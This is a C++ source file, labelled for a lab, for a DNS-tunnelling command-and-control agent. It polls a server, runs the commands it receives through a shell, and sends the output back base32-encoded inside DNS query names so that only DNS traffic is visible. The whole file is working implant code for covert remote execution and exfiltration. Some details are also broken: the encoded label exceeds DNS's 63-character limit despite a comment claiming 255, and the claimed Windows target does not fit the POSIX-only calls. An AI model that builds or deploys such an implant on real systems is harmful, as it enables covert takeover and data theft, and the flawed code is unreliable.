// language: C++17, file: star_dns_c2_agent_mac.cpp, target: macOS/Windows (lab)
// Agent DNS : les commandes arrivent dans les reponses DNS, les resultats repartent
// en queries b32. Aucun port ouvert, aucun flux non-DNS visible.
// Usage: agent <ip_serveur> <port>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <string>

static void b32enc(const char* in, char* out) {
    const char* A = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
    int len = strlen(in), i = 0, bit = 0, val = 0, o = 0;
    while (i < len || bit >= 5) {
        if (bit < 5 && i < len) { val = (val << 8) | (unsigned char)in[i++]; bit += 8; }
        if (bit >= 5) { out[o++] = A[(val >> (bit - 5)) & 31]; bit -= 5; }
    }
    out[o] = 0;
}

// construit et envoie une query DNS raw, retourne l IP reponse (4 octets en string)
static std::string dns_query(int sock, sockaddr_in* srv, const std::string& name) {
    unsigned char pkt[512] = {0}, *p = pkt;
    static unsigned tid = 0x1337;
    *p++ = tid >> 8; *p++ = tid++ & 0xFF;           // id
    *p++ = 0x01; *p++ = 0x00;                        // flags: recursion
    *p++ = 0x00; *p++ = 0x01;                        // qdcount 1
    *p++ = 0x00; *p++ = 0x00;                        // ancount
    *p++ = 0x00; *p++ = 0x00;                        // nscount
    *p++ = 0x00; *p++ = 0x00;                        // arcount
    for (const char* tok = strtok((char*)name.c_str(), "."); tok;
         tok = strtok(NULL, ".")) {
        int l = strlen(tok);
        *p++ = l; memcpy(p, tok, l); p += l;
    }
    *p++ = 0; *p++ = 0; *p++ = 1; *p++ = 0; *p++ = 1;  // type A, class IN

    sendto(sock, pkt, p - pkt, 0, (sockaddr*)srv, sizeof(*srv));
    unsigned char resp[512];
    socklen_t sl = sizeof(*srv);
    int n = recvfrom(sock, resp, sizeof(resp), 0, (sockaddr*)srv, &sl);
    if (n < 28) return "";
    // la reponse A est dans les 4 derniers octets
    char ip[16];
    snprintf(ip, 16, "%u.%u.%u.%u", resp[n-4], resp[n-3], resp[n-2], resp[n-1]);
    return ip;
}

static std::string ip_to_cmd(const std::string& ip) {
    // les octets de l IP SONT la commande (4 octets max, lab)
    int a, b, c, d;
    sscanf(ip.c_str(), "%d.%d.%d.%d", &a, &b, &c, &d);
    std::string out;
    for (int v : {a, b, c, d}) if (v) out += (char)v;
    return out;
}

static void b32dec(const char* in, char* out) {
    const char* A = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
    int bit = 0, val = 0, o = 0;
    for (const char* p = in; *p; p++) {
        const char* q = strchr(A, *p);
        if (!q) break;
        val = (val << 5) | (int)(q - A); bit += 5;
        if (bit >= 8) { out[o++] = (char)((val >> (bit - 8)) & 0xFF); bit -= 8; }
    }
    out[o] = 0;
}

int main(int argc, char** argv) {
    const char* srvIp = argc > 1 ? argv[1] : "127.0.0.1";
    int port = argc > 2 ? atoi(argv[2]) : 5353;

    int s = socket(AF_INET, SOCK_DGRAM, 0);
    sockaddr_in srv{};
    srv.sin_family = AF_INET; srv.sin_port = htons(port);
    srv.sin_addr.s_addr = inet_addr(srvIp);

    for (;;) {
        // check-in : le serveur repond avec une commande (ou rien)
        std::string ip = dns_query(s, &srv, "task.starlab");
        if (ip.empty()) { sleep(10); continue; }
        std::string c = ip_to_cmd(ip);
        if (!c.empty()) {
            // execution + renvoi du resultat en 1er chunk b32
            char out[4096] = {0};
            FILE* f = popen(c.c_str(), "r");
            size_t n = fread(out, 1, 150, f);   // 1 chunk DNS (150 o -> b32 240 < 255 label DNS)
            pclose(f);
            out[n] = 0;
            char enc[256] = {0};
            b32enc(out, enc);
            std::string q = std::string(enc) + ".result.starlab";
            dns_query(s, &srv, q);
        }
        sleep(10);
    }
}
